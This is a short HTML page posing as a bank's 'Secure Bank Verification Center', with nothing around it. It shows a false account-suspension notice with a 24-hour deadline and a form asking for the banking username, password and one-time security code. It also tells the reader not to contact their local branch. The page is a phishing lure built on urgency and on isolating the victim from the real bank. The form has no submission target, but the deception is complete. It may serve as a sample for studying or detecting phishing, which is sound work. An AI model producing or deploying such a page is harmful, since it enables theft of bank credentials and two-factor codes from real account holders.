<!doctype html>
<html>
<head><meta charset="utf-8"><title>Secure Bank Verification Center</title></head>
<body>
  <h1>Secure Bank Verification Center</h1>
  <p>URGENT: Your account has been suspended. Verify now within 24 hours to avoid permanent account lock.</p>
  <form>
    <label>Online banking username <input placeholder="username"></label>
    <label>Password <input type="password" placeholder="password"></label>
    <label>One-time security code <input placeholder="security code"></label>
    <button>Verify immediately</button>
  </form>
  <p>Do not contact your local branch. Only through this page can your account be restored.</p>
</body>
</html>
